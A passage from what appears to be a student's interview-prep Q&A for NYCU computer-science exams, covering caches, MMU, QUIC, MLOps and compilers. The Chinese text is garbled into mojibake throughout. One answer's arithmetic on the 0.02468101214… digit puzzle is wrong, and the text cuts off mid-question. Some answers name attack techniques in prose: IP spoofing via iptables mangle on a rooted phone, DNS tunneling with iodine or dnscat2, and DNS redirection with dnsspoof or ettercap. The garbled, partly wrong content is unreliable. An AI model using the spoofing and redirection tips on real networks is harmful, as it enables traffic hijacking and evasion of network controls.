é€éè®€å¯«å…§å­˜åœ°å€é€²è¡Œè¨­å‚™é€šè¨Šï¼Œé©åˆéœ€è¦å¿«é€Ÿè¨ªå•è¨­å‚™çš„æ‡‰ç”¨å ´æ™¯ã€‚</li><li>   Q: Android æ‰‹æ©Ÿæ˜¯å¦å¯ä»¥é€²è¡Œ IP Spoofingï¼Ÿå¦‚ä½•å¯¦ç¾ï¼Ÿ<br>  A: æ˜¯çš„ï¼Œå¯ä»¥é€é root æ¬Šé™ä¾†æ›´æ”¹ç¶²çµ¡å°åŒ…çš„ä¾†æº IPã€‚ä½¿ç”¨ iptables çš„ mangle è¡¨æˆ–è‡ªè¨‚ socket å¯«å…¥è‡ªè¨‚çš„ IP åœ°å€é”åˆ° spoofing æ•ˆæœï¼Œä½†å¯èƒ½é•æ³•æˆ–é•åç¶²çµ¡æ”¿ç­–ã€‚</li><li>   Q: è§£é‡‹ QUIC å”è­°ï¼Œä¸¦èˆ‡ TCP å’Œ UDP æ¯”è¼ƒã€‚<br>  A: QUIC æ˜¯ç”± Google é–‹ç™¼çš„æ–°å”è­°ï¼Œæ—¨åœ¨è§£æ±º TCP çš„é€£ç·šå»ºç«‹å»¶é²å’Œ UDP çš„ç„¡é€£æ¥ç¼ºé™·ã€‚å®ƒåŸºæ–¼ UDP å‚³è¼¸å±¤ï¼Œå¯¦ç¾äº†å¤šè·¯è¤‡ç”¨ã€ä½å»¶é²å’Œè‡ªå‹•åŠ å¯†ï¼Œé©åˆä½å»¶é²å’Œé »ç¹é€£ç·šè®Šæ›´çš„æ‡‰ç”¨å ´æ™¯ï¼Œä¾‹å¦‚ä¸²æµå’Œå³æ™‚äº’å‹•ã€‚</li><li>   Q: ç•¶æ”¶ä¸åˆ° ACK æ™‚ï¼Œå¦‚ä½•ç¢ºå®šå°æ–¹è£ç½®æ˜¯é—œæ©Ÿé‚„æ˜¯ç¶²è·¯å•é¡Œï¼Ÿ<br>  A: å¯ä½¿ç”¨ ping æª¢æŸ¥æ˜¯å¦èƒ½é”åˆ°ç›®æ¨™çš„ IPã€‚è‹¥ç„¡å›æ‡‰ä¸”è¨­å‚™æ”¯æŒï¼Œé€šé ARP è«‹æ±‚çœ‹æ˜¯å¦æœ‰ç›¸æ‡‰çš„ MAC åœ°å€ï¼Œæˆ–æŸ¥é–±è·¯ç”±è¡¨å’Œ DNS æª¢æŸ¥ç¶²çµ¡è¨­ç½®ã€‚</li><li>   Q: å¦‚æœèƒ½ ping åˆ° DNS ä¼ºæœå™¨ï¼Œèƒ½å¦é€éå…¶ä»–æ–¹å¼ä¸Šç¶²ï¼Ÿ<br>  A: æ˜¯çš„ï¼Œå¯ä»¥åˆ©ç”¨ DNS éš§é“ å°‡æ•¸æ“šå°è£åœ¨ DNS æŸ¥è©¢ä¸­å‚³è¼¸ï¼Œé€™æ˜¯ä¸€ç¨®åœ¨å°é–æˆ–å—é™ç¶²çµ¡ä¸­é€²è¡Œéš§é“é€šä¿¡çš„æ–¹æ³•ï¼Œä¾‹å¦‚ä½¿ç”¨ iodine æˆ– dnscat2ã€‚</li><li>   Q: å¦‚ä½•ç‚ºå®¶ä¸­çš„ Wi-Fi è·¯ç”±å™¨å¢åŠ åŠŸèƒ½ï¼Ÿéœ€è¦å“ªäº›å·¥å…·ï¼Ÿ<br>  A: å¯ä»¥ä¸‹è¼‰ä¸¦ç·¨è­¯é©åˆè·¯ç”±å™¨çš„é–‹æºéŸŒé«”ï¼ˆå¦‚ OpenWRT æˆ– DD-WRTï¼‰ï¼Œåœ¨é–‹ç™¼ç’°å¢ƒä¸‹ä½¿ç”¨ C æˆ– shell è…³æœ¬ç·¨å¯«æ–°åŠŸèƒ½ã€‚éœ€è¦äº¤å‰ç·¨è­¯å·¥å…·ã€ä¸²å£ç·šã€éŸŒé«”ç‡’éŒ„å·¥å…·åŠæ–‡æª”æ”¯æ´ã€‚</li><li>   Q: å¦‚ä½•åˆ©ç”¨ GPU åŠ é€Ÿè¨ˆç®—ï¼Ÿ<br>  A: GPU çš„å¤šæ ¸æ¶æ§‹é©åˆå¤§è¦æ¨¡ä¸¦è¡Œè¨ˆç®—ï¼Œå¯ä½¿ç”¨ CUDAï¼ˆNVIDIAï¼‰æˆ– OpenCL é€²è¡Œ GPU åŠ é€Ÿç·¨ç¨‹ï¼Œåœ¨æ·±åº¦å­¸ç¿’ã€æ•¸æ“šè™•ç†ç­‰æ‡‰ç”¨ä¸­é¡¯è‘—æå‡é‹ç®—é€Ÿåº¦ã€‚</li><li>   Q: ä»€éº¼æ˜¯é›²åŸç”Ÿï¼ˆCloud Nativeï¼‰ï¼Ÿ<br> A: é›²åŸç”Ÿæ˜¯åˆ©ç”¨å®¹å™¨ã€å¾®æœå‹™æ¶æ§‹ã€æŒçºŒäº¤ä»˜ã€æœå‹™ç¶²æ ¼ç­‰å·¥å…·å’ŒæŠ€è¡“ä¾†æ§‹å»ºå’Œé‹è¡Œå¯æ“´å±•ã€å½ˆæ€§ã€å‹•æ…‹èª¿åº¦çš„æ‡‰ç”¨ç¨‹åºï¼Œå„ªå‹¢åœ¨æ–¼æ›´å¿«é€Ÿçš„éƒ¨ç½²å’Œæ“´å±•ï¼Œé©åˆç¾ä»£çš„åˆ†æ•£å¼è¨ˆç®—ç’°å¢ƒã€‚</li><li>   Q: ä»€éº¼æ˜¯ MLOpsï¼Ÿ<br> A: MLOps æ˜¯æ©Ÿå™¨å­¸ç¿’é‹ç‡Ÿçš„æœ€ä½³å¯¦è¸ï¼Œçµåˆäº†æ©Ÿå™¨å­¸ç¿’ã€DevOps å’Œæ•¸æ“šå·¥ç¨‹ï¼Œç”¨æ–¼è‡ªå‹•åŒ–æ¨¡å‹è¨“ç·´ã€éƒ¨ç½²å’Œç›£æ§ï¼Œç¢ºä¿æ¨¡å‹åœ¨ç”Ÿç”¢ç’°å¢ƒä¸­çš„ç©©å®šæ€§å’Œå¯æ“´å±•æ€§ã€‚</li></ol><h4 id="111-è€ƒå¤é¡Œ"><a href="#111-è€ƒå¤é¡Œ" class="headerlink" title="111 è€ƒå¤é¡Œ"></a>111 è€ƒå¤é¡Œ</h4><ul><li><a class="link"   href="https://hackmd.io/@bogay/111-NYCU-CS-aptitude-test" >https://hackmd.io/@bogay/111-NYCU-CS-aptitude-test <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul><ol><li><p>Q: Cache -&gt; Virtual Memory -&gt; MMU -&gt; Physical Memory é—œä¿‚<br>A: </p><ol><li>Cacheï¼šä½æ–¼è™•ç†å™¨å…§çš„é«˜é€Ÿè¨˜æ†¶é«”ï¼Œç”¨æ–¼å„²å­˜è¿‘æœŸå­˜å–çš„è³‡æ–™å’ŒæŒ‡ä»¤ã€‚Cache åˆ†ç‚º L1ã€L2ã€L3 ç´šåˆ¥ï¼Œä¾æ¬¡é›¢è™•ç†å™¨è¶Šé ã€å®¹é‡è¶Šå¤§ã€é€Ÿåº¦è¶Šæ…¢ã€‚Cache å¯æ¸›å°‘ CPU å­˜å–è¼ƒæ…¢çš„ä¸»è¨˜æ†¶é«” (RAM) çš„æ¬¡æ•¸ã€‚</li><li>   è™›æ“¬è¨˜æ†¶é«” (Virtual Memory)ï¼šè™›æ“¬è¨˜æ†¶é«”ä½¿æ¯å€‹ç¨‹å¼æ“æœ‰å…¶ç¨ç«‹çš„è¨˜æ†¶é«”ç©ºé–“ï¼Œé€éåˆ†é æ©Ÿåˆ¶å°‡ä¸»è¨˜æ†¶é«”å’Œç¡¬ç¢Ÿç©ºé–“çµåˆï¼Œä¸¦æä¾›æ¯”å¯¦é«”è¨˜æ†¶é«”æ›´å¤§çš„å¯ç”¨ç©ºé–“ã€‚è™›æ“¬è¨˜æ†¶é«”çš„åœ°å€ (virtual address) ç”±ç¨‹å¼æŒ‡å®šï¼Œä¸¦éœ€è¦è½‰æ›ç‚ºå°æ‡‰çš„å¯¦é«”åœ°å€ã€‚</li><li>   è¨˜æ†¶é«”ç®¡ç†å–®å…ƒ (MMU)ï¼šMMU æ˜¯è™•ç†å™¨ä¸­çš„ç¡¬é«”å…ƒä»¶ï¼Œè² è²¬å°‡è™›æ“¬è¨˜æ†¶é«”åœ°å€è½‰æ›ç‚ºå¯¦é«”è¨˜æ†¶é«”åœ°å€ã€‚MMU é€šå¸¸ä½¿ç”¨åˆ†é è¡¨ (page table) å„²å­˜è™›æ“¬åˆ°å¯¦é«”åœ°å€çš„æ˜ å°„é—œä¿‚ï¼Œä¸¦å¿«å–å¸¸ç”¨çš„æ˜ å°„è³‡æ–™ï¼Œæå‡è½‰æ›æ•ˆç‡ã€‚</li><li>   å¯¦é«”è¨˜æ†¶é«” (Physical Memory)ï¼šå³é›»è…¦ä¸­çš„ä¸»è¨˜æ†¶é«”æˆ– RAMï¼Œè² è²¬å„²å­˜æ­£åœ¨åŸ·è¡Œçš„è³‡æ–™å’Œç¨‹å¼ã€‚è™•ç†å™¨é€é MMU ä¾†è¨ªå•å¯¦é«”è¨˜æ†¶é«”ä¸­çš„è³‡æ–™ã€‚</li></ol><p>æ•´é«”æµç¨‹ï¼š<br>ç•¶ CPU è¦å­˜å–è¨˜æ†¶é«”åœ°å€æ™‚ï¼Œå®ƒæœƒå…ˆæª¢æŸ¥ cacheã€‚è‹¥ cache æœªå‘½ä¸­ï¼Œå‰‡ CPU æœƒä½¿ç”¨è™›æ“¬åœ°å€é€é MMU æŸ¥è©¢å°æ‡‰çš„å¯¦é«”åœ°å€ï¼Œä¸¦å¾å¯¦é«”è¨˜æ†¶é«”ä¸­è®€å–è³‡æ–™ã€‚ç•¶è¨˜æ†¶é«”ä¸å¤ æ™‚ï¼Œè™›æ“¬è¨˜æ†¶é«”æ©Ÿåˆ¶æœƒå°‡è¼ƒå°‘ä½¿ç”¨çš„è³‡æ–™å¾å¯¦é«”è¨˜æ†¶é«”ç§»è‡³ç¡¬ç¢Ÿï¼Œä»¥é¨°å‡ºç©ºé–“ã€‚    </p></li><li><p>Q: mmap I&#x2F;O è§£é‡‹<br>A: mmap I&#x2F;O æ˜¯ä¸€ç¨®é«˜æ•ˆçš„æ–‡ä»¶æ“ä½œæ–¹å¼ï¼Œå®ƒå°‡æ–‡ä»¶ç›´æ¥æ˜ å°„åˆ°ç¨‹å¼çš„è¨˜æ†¶é«”ç©ºé–“ï¼Œä½¿æ–‡ä»¶å…§å®¹åƒåœ¨è¨˜æ†¶é«”ä¸­ä¸€æ¨£è¢«å­˜å–ã€‚é€™æ¨£å¯ä»¥æ¸›å°‘ç³»çµ±å‘¼å«ä¸¦æé«˜ I&#x2F;O æ€§èƒ½ã€‚ç•¶å­˜å–æ˜ å°„å€åŸŸæ™‚ï¼Œç³»çµ±æœƒè‡ªå‹•å¾æ–‡ä»¶ä¸­è¼‰å…¥éœ€è¦çš„éƒ¨åˆ†åˆ°è¨˜æ†¶é«”ã€‚å¸¸ç”¨æ–¼è™•ç†å¤§æ–‡ä»¶ã€é€²ç¨‹é–“å…±äº«è¨˜æ†¶é«”ï¼Œæˆ–æ“ä½œ I&#x2F;O è¨­å‚™ã€‚</p></li><li><p>Q: AI&#x2F;ML MLOps life cycle<br>A: MLOps æ˜¯ç®¡ç†æ©Ÿå™¨å­¸ç¿’æ¨¡å‹å…¨ç”Ÿå‘½å‘¨æœŸçš„æµç¨‹ï¼Œå¾è³‡æ–™æ”¶é›†ã€æ¨¡å‹é–‹ç™¼ã€éƒ¨ç½²åˆ°ç›£æ§èˆ‡å„ªåŒ–ï¼Œå¼·èª¿è‡ªå‹•åŒ–ã€ç‰ˆæœ¬æ§åˆ¶åŠæŒçºŒæ”¹é€²ã€‚å®ƒå”åŠ©æ¨¡å‹åœ¨å¯¦éš›ç’°å¢ƒä¸­ç©©å®šé«˜æ•ˆåœ°é‹è¡Œï¼Œä¸¦æ”¯æŒå¿«é€Ÿè¿­ä»£å’Œæ“´å±•ã€‚</p></li><li><p>Q: Cloud Native Computing çš„ Major å’Œ Component<br>A: </p><ul><li>Cloud Native Computing çš„ä¸»è¦æ ¸å¿ƒï¼ˆMajorï¼‰åŒ…æ‹¬ï¼š</li></ul><ol><li>   å¯æ“´å±•æ€§ï¼šæ”¯æ´é«˜å½ˆæ€§å’Œéš¨éœ€æ“´å±•ï¼Œé©æ‡‰ä½¿ç”¨é‡çš„è®ŠåŒ–ã€‚</li><li>   å½ˆæ€§å’Œå®¹éŒ¯æ€§ï¼šå…·å‚™è‡ªæˆ‘ä¿®å¾©èƒ½åŠ›ï¼Œæ¸›å°‘æ•…éšœçš„å½±éŸ¿ã€‚</li><li>   æ•æ·é–‹ç™¼ï¼šæ”¯æ´å¿«é€Ÿéƒ¨ç½²ã€é »ç¹æ›´æ–°ï¼Œç¬¦åˆ CI&#x2F;CD æµç¨‹ã€‚</li></ol><ul><li>å…¶ä¸»è¦çµ„ä»¶ï¼ˆComponentsï¼‰åŒ…æ‹¬ï¼š</li></ul><ol><li>   å®¹å™¨ï¼šä¾‹å¦‚ Dockerï¼Œç”¨æ–¼è¼•é‡åŒ–æ‡‰ç”¨æ‰“åŒ…å’Œç§»å‹•ã€‚</li><li>   å¾®æœå‹™ï¼šå°‡æ‡‰ç”¨æ‹†åˆ†æˆå°å‹ã€ç¨ç«‹çš„æœå‹™ï¼Œæ˜“æ–¼ç®¡ç†å’Œæ“´å±•ã€‚</li><li>   Kubernetesï¼šç”¨æ–¼å®¹å™¨ç·¨æ’ï¼Œç®¡ç†å®¹å™¨çš„éƒ¨ç½²å’Œæ“´å±•ã€‚</li><li>   æœå‹™ç¶²æ ¼ï¼šä¾‹å¦‚ Istioï¼Œè² è²¬ç®¡ç†å¾®æœå‹™é–“çš„é€šä¿¡ã€‚</li></ol></li><li><p>Q: 0.02468101214â€¦ å°æ•¸é»å¾Œç¬¬ 1000 ä½æ˜¯å•¥æ•¸å­—<br>A: é€™å€‹æ•¸åˆ—çš„è¦å¾‹æ˜¯ä¾æ¬¡å¢åŠ  2ï¼ˆ0ã€2ã€4ã€6ã€8ã€1ã€0ã€1ã€2ã€1ã€4ï¼‰ï¼Œæ¯ 10 ä½å¾ªç’°ä¸€æ¬¡ã€‚å› ç‚ºæˆ‘å€‘è¦æ‰¾ç¬¬ 1000 ä½çš„æ•¸å­—ï¼Œå¯ä»¥è¨ˆç®— 1000 mod 10 &#x3D; 0ï¼Œé€™è¡¨ç¤ºç¬¬ 1000 ä½æ­£å¥½åœ¨ä¸€å€‹å®Œæ•´å¾ªç’°çš„çµå°¾ã€‚<br>æ‰€ä»¥ç¬¬ 1000 ä½æ•¸å­—å°±æ˜¯å¾ªç’°çš„ç¬¬ 10 ä½æ•¸å­—ï¼Œå°æ‡‰çš„æ•¸å­—ç‚º 4ã€‚</p></li><li><p>Q: 100 * 99 - 98 * 97 - â€¦ + 4 * 3 - 2 * 1 &#x3D;?<br>A: åˆ†çµ„è¨ˆç®—æ‡‰è©²æœƒç™¼ç¾æ˜¯ç­‰å·®æ•¸åˆ—</p></li><li><p>Q: Clang æ˜¯å•¥<br>A: Clang æ˜¯ä¸€å€‹åŸºæ–¼ LLVM çš„é–‹æºç·¨è­¯å™¨å‰ç«¯ï¼Œä¸»è¦ç”¨æ–¼ Cã€C++ å’Œ Objective-C ç­‰èªè¨€çš„ç·¨è­¯ã€‚å®ƒçš„ç‰¹è‰²æ˜¯ç·¨è­¯é€Ÿåº¦å¿«ã€æä¾›æ˜“è®€çš„éŒ¯èª¤è¨Šæ¯ã€ä¸¦æ”¯æ´æ¨¡çµ„åŒ–çš„ç·¨è­¯æ¶æ§‹ï¼Œå¸¸ç”¨æ–¼ç¾ä»£é–‹ç™¼ç’°å¢ƒå’Œå·¥å…·éˆä¸­ã€‚</p></li><li><p>Q: Syntax Directed Compile æ˜¯å•¥<br>A: Syntax Directed Compile æ˜¯ä¸€ç¨®åœ¨ç·¨è­¯éç¨‹ä¸­ä½¿ç”¨èªæ³•å°å‘çš„è¦å‰‡é€²è¡Œç¿»è­¯çš„æ–¹æ³•ã€‚å®ƒæ ¹æ“šèªæ³•çµæ§‹ä¾†æ±ºå®šå¦‚ä½•ç”Ÿæˆç¨‹å¼ç¢¼ï¼Œé€éèªæ³•æ¨¹ä¾†åŸ·è¡Œå„éšæ®µçš„æ“ä½œï¼ŒåŒ…å«èªæ³•åˆ†æã€èªæ„æª¢æŸ¥èˆ‡ä¸­é–“ç¢¼ç”Ÿæˆï¼Œé€šå¸¸ç”¨æ–¼ç·¨è­¯å™¨è¨­è¨ˆä¸­ä¾†æ›´æº–ç¢ºåœ°è½‰æ›åŸå§‹ç¢¼è‡³ç›®æ¨™ç¢¼ã€‚</p></li><li><p>Q: DNS redirect attack æ˜¯å•¥? æ€éº¼åœ¨ Linux ä¸Šå¯¦ä½œ<br>A: DNS Redirect Attack æ˜¯ä¸€ç¨®æ”»æ“Šæ–¹æ³•ï¼Œæ”»æ“Šè€…é€éç«„æ”¹ DNS è³‡æ–™ï¼Œå°‡ç”¨æˆ¶çš„ DNS è«‹æ±‚é‡æ–°å°å‘åˆ°æƒ¡æ„ç¶²ç«™ï¼Œç›®çš„æ˜¯é€²è¡Œé‡£é­šæˆ–ç«Šå–è³‡æ–™ã€‚æ”»æ“Šæ–¹å¼å¯èƒ½åŒ…æ‹¬ ARP æ¬ºé¨™ã€DNS å½é€ ç­‰ã€‚</p><p>åœ¨ Linux ä¸Šæ¨¡æ“¬é€™é¡æ”»æ“Šå¯ä»¥ä½¿ç”¨å·¥å…·ï¼Œä¾‹å¦‚ dnsspoof æˆ– ettercapï¼Œä¸¦ä¸”è¨­å®šç¶²å¡ç‚ºæ··é›œæ¨¡å¼ï¼Œç„¶å¾Œåœ¨ç¶²è·¯ä¸­æ””æˆªå’Œä¿®æ”¹ DNS è«‹æ±‚ä¾†é”æˆé‡å°æ•ˆæœã€‚ä¸éï¼Œé€™æ¨£çš„è¡Œç‚ºæœƒå°ä½¿ç”¨è€…çš„éš±ç§èˆ‡å®‰å…¨é€ æˆå½±éŸ¿ï¼Œä¸”å±¬æ–¼é•æ³•è¡Œç‚ºï¼Œæ‡‰åƒ…é™æ–¼åˆæ³•ã€ç¶“æˆæ¬Šçš„å®‰å…¨æ¸¬è©¦ç’°å¢ƒã€‚</p></li><li><p>Q: å¯¦ä½œéå“ªäº› CVE<br>A: </p><ul><li>Server-Side Request Forgery (SSRF) (CVE-2023-35133)</li><li>CVE-2018-4407 (Apple XNU Kernel Integer Overflow)ï¼š<ul><li>é€™æ˜¯ macOS å’Œ iOS ä¸Šçš„ä¸€å€‹ kernel ç¼ºé™·ï¼Œä½†å®ƒæ­ç¤ºäº† IoT å’ŒåµŒå…¥å¼ç³»çµ±ä¸­å¸¸è¦‹çš„æ•´æ•¸æº¢ä½å•é¡Œã€‚<br>â€¢å±•ç¤ºæ–¹å‘ï¼šè¨è«–å¦‚ä½•ç™¼ç¾å’Œåˆ©ç”¨æ•´æ•¸æº¢ä½ï¼Œä¸¦è¨­è¨ˆå°æ‡‰çš„ä¿®å¾©æ–¹å¼ï¼Œé€™ç¨®æº¢ä½æ¼æ´åœ¨ binary exploitation ä¸­éå¸¸æ™®éã€‚</li></ul></li></ul></li><li><p>Q: buffer overflow å¸¸è¦‹çš„å½¢å¼<br>A: </p><ol><li>   Stack-based Overflowï¼šç•¶ç¨‹å¼éå¤šå¯«å…¥è³‡æ–™åˆ°å †ç–Šä¸­çš„ç·©è¡å€æ™‚ï¼Œå¯èƒ½è¦†è“‹é—œéµè¨˜æ†¶é«”åœ°å€ï¼ˆä¾‹å¦‚è¿”å›åœ°å€ï¼‰ï¼Œå°è‡´ç¨‹å¼æ§åˆ¶æµè¢«åŠ«æŒã€‚</li><li>   Heap-based Overflowï¼šç™¼ç”Ÿåœ¨å †å€ï¼ˆheapï¼‰ä¸­ï¼Œç•¶åˆ†é…çš„è¨˜æ†¶é«”å€åŸŸè¢«æº¢å‡ºï¼Œå½±éŸ¿ç›¸é„°çš„è¨˜æ†¶é«”å¡Šï¼Œå¯èƒ½å°è‡´æƒ¡æ„ç¨‹å¼ç¢¼åŸ·è¡Œã€‚</li></ol></li><li><p>Q: TCP å’Œ UDP å„æœ‰ä¸å¥½ï¼Œæ‰€ä»¥ Google æ¨å‡ºäº†æ–°çš„ protocol QUIC å–ä»£ TCP ï¼Œç‚ºä½•?<br>A: Google æ¨å‡º QUIC å”è­°ä¾†å–ä»£ TCPï¼Œä¸»è¦æ˜¯ç‚ºäº†è§£æ±º TCP å’Œ UDP çš„ä¸€äº›ç¼ºé»ã€‚QUIC çµåˆäº† TCP çš„å¯é å‚³è¼¸å’Œ UDP çš„ä½å»¶é²ç‰¹æ€§ï¼Œæä¾›æ›´å¿«çš„é€£ç·šå»ºç«‹é€Ÿåº¦å’Œæ›´å¥½çš„æµé‡æ§åˆ¶ï¼Œç‰¹åˆ¥é©åˆæ–¼ç¾ä»£ç¶²è·¯æ‡‰ç”¨ã€‚QUIC æ”¯æ´å¤šè·¯å¾‘å‚³è¼¸ã€æ¸›å°‘é‡å‚³å»¶é²ï¼Œä¸¦ä¸”å…§å»ºåŠ å¯†ï¼Œå› æ­¤æå‡äº†å‚³è¼¸é€Ÿåº¦ã€å¯é æ€§å’Œå®‰å…¨æ€§ï¼Œç‰¹åˆ¥é©ç”¨æ–¼é«˜æ•ˆèƒ½çš„ç¶²è·¯æœå‹™ã€‚</p></li><li><p>Q: TCP Syn æ²’æœ‰å›è¦†æœ‰ IP æ²’æœ‰æ©Ÿå™¨ï¼Œå’Œ IP æœ‰æ©Ÿå™¨ä½†æ²’æœ‰å°æ‡‰çš„ Serviceï¼Œå¯« socket programming æ™‚æ€éº¼åˆ†è¾¨?<br>A: </p><ol><li>   é€£ç·šé€¾æ™‚ (Timeout)ï¼šè‹¥å®Œå…¨æ²’æœ‰æ”¶åˆ°ä»»ä½•å›æ‡‰ï¼Œé€šå¸¸è¡¨ç¤º IP åœ°å€ä¸Šæ²’æœ‰æ©Ÿå™¨æˆ–ç¶²è·¯ä¸é€šã€‚</li><li>   ICMP å›æ‡‰ (å¦‚ Destination Unreachable)ï¼šè‹¥æ”¶åˆ°ç‰¹å®šçš„ ICMP éŒ¯èª¤å›æ‡‰ï¼Œè¡¨ç¤º IP å­˜åœ¨ä½†è©²åŸ æ²’æœ‰æœå‹™ã€‚é€™é€šå¸¸æ˜¯ IP æœ‰æ©Ÿå™¨ä½†è©²åŸ ä¸Šæ²’æœ‰å°æ‡‰çš„æœå‹™ã€‚</li></ol></li><li><p>Q: wifi å¯èƒ½æœƒæ²’æœ‰è‡ªå·±æƒ³è¦çš„åŠŸèƒ½ï¼Œæœ‰æ²’æœ‰è¾¦æ³•ä½¿ç”¨ c èªè¨€åœ¨ä¸Šé¢æ–°å¢åŠŸèƒ½ï¼Œåˆ—å‡ºéœ€è¦çš„å·¥å…·<br>A: </p><ol><li>   é–‹ç™¼æ¿èˆ‡é©…å‹•ç¨‹å¼åŸå§‹ç¢¼ï¼šä¾‹å¦‚ WiFi æ¨¡çµ„çš„ SDKï¼Œå¦‚ ESP8266 æˆ– ESP32 ç­‰é–‹ç™¼æ¿çš„ SDK å’ŒåŸå§‹ç¢¼ã€‚</li><li>   C ç·¨è­¯å™¨èˆ‡å·¥å…·éˆï¼šé©åˆç›®æ¨™è¨­å‚™çš„äº¤å‰ç·¨è­¯å™¨ï¼ˆå¦‚ GCC å·¥å…·éˆï¼‰ï¼Œä»¥ä¾¿å°‡ C ä»£ç¢¼ç·¨è­¯æˆè¨­å‚™å¯åŸ·è¡Œçš„æ ¼å¼ã€‚</li><li>   é–‹ç™¼æ¿é©…å‹•ç¨‹å¼ API æ–‡ä»¶ï¼šç­è§£ç¡¬é«”åŠŸèƒ½å’Œ API ä»‹é¢ï¼Œä»¥ä¾¿ä½¿ç”¨æ­£ç¢ºçš„å‡½æ•¸å’Œæ§åˆ¶æŒ‡ä»¤ã€‚</li><li>   æ¸¬è©¦èˆ‡èª¿è©¦å·¥å…·ï¼šå¦‚ JTAG èª¿è©¦å™¨æˆ– UART ä¸²å£å·¥å…·ï¼Œä¾¿æ–¼æ¸¬è©¦å’Œèª¿æ•´åŠŸèƒ½ã€‚</li></ol></li><li><p>Q: OpenID å’Œ OAuth å·®åˆ¥<br>A: OpenID ç”¨æ–¼ã€Œèº«ä»½é©—è­‰ã€ï¼Œç¢ºèªä½¿ç”¨è€…çš„èº«ä»½ï¼›OAuth ç”¨æ–¼ã€Œæˆæ¬Šã€ï¼Œå…è¨±æ‡‰ç”¨ç¨‹å¼è¨ªå•ä½¿ç”¨è€…çš„ç‰¹å®šè³‡æºã€‚ç°¡è€Œè¨€ä¹‹ï¼ŒOpenID æ˜¯ã€Œèª°æ˜¯ä½ ï¼Ÿã€è€Œ OAuth æ˜¯ã€Œå¯ä»¥åšä»€éº¼ï¼Ÿã€</p></li><li><p>Q: Instrution-Set Architecture å’Œ Micro Architecture å·®åˆ¥<br>A: Instruction-Set Architecture (ISA) å®šç¾©äº†é›»è…¦è™•ç†å™¨æ‰€èƒ½åŸ·è¡Œçš„æŒ‡ä»¤å’Œæ“ä½œï¼Œæ˜¯ç¡¬é«”å’Œè»Ÿé«”ä¹‹é–“çš„ç•Œé¢ã€‚è€Œ Microarchitecture å‰‡æ˜¯å¯¦ç¾é€™äº›æŒ‡ä»¤çš„å…§éƒ¨è¨­è¨ˆçµæ§‹ï¼Œæ±ºå®šè™•ç†å™¨å¦‚ä½•å…·é«”åŸ·è¡Œ ISA å®šç¾©çš„æŒ‡ä»¤ã€‚</p></li><li><p>Q: Linux Device Debug å’Œæ€éº¼ä¸é‡æ–°ç·¨è­¯å°±å¯ä»¥æ¸¬è©¦å¤šç­†è¼¸å…¥<br>A: Linux Device Debugï¼šå¯ä»¥ä½¿ç”¨ dmesg æˆ– printk() ä¾†æŸ¥çœ‹å…§æ ¸è¨Šæ¯ï¼Œä¸¦ä½¿ç”¨ strace æˆ– gdb èª¿è©¦ç¨‹å¼è¡Œç‚ºã€‚</p><p>æ¸¬è©¦å¤šç­†è¼¸å…¥ä¸é‡æ–°ç·¨è­¯ï¼šå¯ä»¥ä½¿ç”¨ echo å’Œ cat æ­é…ç®¡ç·šï¼Œæˆ–æ˜¯æŠŠå¤šç­†æ¸¬è©¦è³‡æ–™æ”¾åœ¨æª”æ¡ˆä¸­ï¼Œåˆ©ç”¨ &lt; filename å°‡å¤šç­†è¼¸å…¥å°å…¥ç¨‹å¼ï¼Œç„¡é ˆé‡æ–°ç·¨è­¯å³å¯æ¸¬è©¦ä¸åŒè³‡æ–™ã€‚</p></li><li><p>Q: Top-down å’Œ buttom-up parse çš„å·®åˆ¥<br>A: Top-down parseï¼šå¾æ ¹ç¯€é»é–‹å§‹ï¼Œé€æ­¥å°‡èªæ³•çµæ§‹å±•é–‹ï¼Œç›´åˆ°ç¬¦åˆè¼¸å…¥åºåˆ—ï¼Œå¸¸è¦‹æ–¹æ³•æ˜¯éæ­¸ä¸‹é™è§£æã€‚</p><p>Bottom-up parseï¼šå¾è¼¸å…¥åºåˆ—é–‹å§‹ï¼Œé€æ­¥å°‡ç¬¦è™Ÿæ­¸ç´„æˆæ›´é«˜å±¤çš„èªæ³•çµæ§‹ï¼Œç›´åˆ°é”åˆ°æ ¹ç¯€é»ï¼Œå¸¸è¦‹æ–¹æ³•æ˜¯ç§»å…¥-æ­¸ç´„è§£æï¼ˆå¦‚ LR è§£æï¼‰ã€‚</p></li><li><p>Q: å¯«å€‹æ¼”ç®—æ³•å¯ä»¥æ‰¾åˆ° Set ä¸­ç‰¹å®šçš„ Itemï¼Œä¸¦å˜—è©¦ç”¨ GPU åŠ é€Ÿ<br>A: </p><ol><li>   ä½¿ç”¨æ¼”ç®—æ³•éæ­· Set ä¸­çš„å…ƒç´ ï¼Œé€ä¸€æ¯”å°æ˜¯å¦ç‚ºç›®æ¨™ Itemã€‚</li><li>   å°‡ Set åˆ†å‰²æˆå¤šå€‹éƒ¨åˆ†ï¼Œä¸¦åœ¨ GPU ä¸­ä½µè¡ŒåŸ·è¡Œæ¯”å°ï¼Œåˆ©ç”¨ CUDA æˆ– OpenCL ç­‰æŠ€è¡“ä¾†å¹³è¡ŒåŒ–æŸ¥æ‰¾éç¨‹ã€‚</li><li>   åœ¨ GPU ä¸­ï¼Œåˆ†é…æ¯å€‹åŸ·è¡Œç·’å»æŸ¥æ‰¾å„è‡ªéƒ¨åˆ†çš„å…ƒç´ ï¼ŒåŠ é€Ÿæ•´é«”æœç´¢éç¨‹ã€‚</li></ol></li><li><p>Q: æœ‰å€‹ service å¯ä»¥ DNS åˆ° Googleï¼Œæœ‰è¾¦æ³•è®“ä»– access åˆ°å…¶ä»–ç¶²ç«™å—?<br>A: å¯ä»¥é€éä¿®æ”¹è©²æœå‹™çš„ DNS è¨­å®šï¼Œå°‡å®ƒçš„è§£æç›®æ¨™æŒ‡å‘å…¶ä»–ç¶²ç«™çš„ IP åœ°å€ï¼Œé€™æ¨£è©²æœå‹™å°±å¯ä»¥è¨ªå•æŒ‡å®šçš„å…¶ä»–ç¶²ç«™ã€‚</p></li></ol><h4 id="110-è€ƒå¤é¡Œ"><a href="#110-è€ƒå¤é¡Œ" class="headerlink" title="110 è€ƒå¤é¡Œ"></a>110 è€ƒå¤é¡Œ</h4><ul><li><a class="link"   href="https://hackmd.io/@as535364/110-NYCU-CS-aptitude-test" >https://hackmd.io/@as535364/110-NYCU-CS-aptitude-test <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>3 é  5 é¢ 25 é¡Œã€‚</li></ul><ol><li><p>Q: çµ¦ä½ ä»¥ä¸‹çš„ codeï¼Œè«‹ä½ å¡«ç©ºå…¶ä¸­ä¸€å€‹ if 